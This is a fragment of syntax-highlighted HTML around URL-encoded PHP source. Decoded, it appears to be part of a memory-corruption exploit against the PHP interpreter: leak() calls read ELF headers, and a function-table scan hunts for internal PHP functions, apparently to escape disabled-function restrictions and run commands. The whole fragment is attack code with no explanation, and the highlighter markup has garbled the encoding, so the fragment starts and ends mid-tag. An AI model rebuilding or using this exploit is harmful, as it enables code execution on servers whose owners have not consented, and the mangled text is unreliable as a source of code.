class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">73</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">36</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>f%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">73</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">35</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">73</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">7</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">7</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span 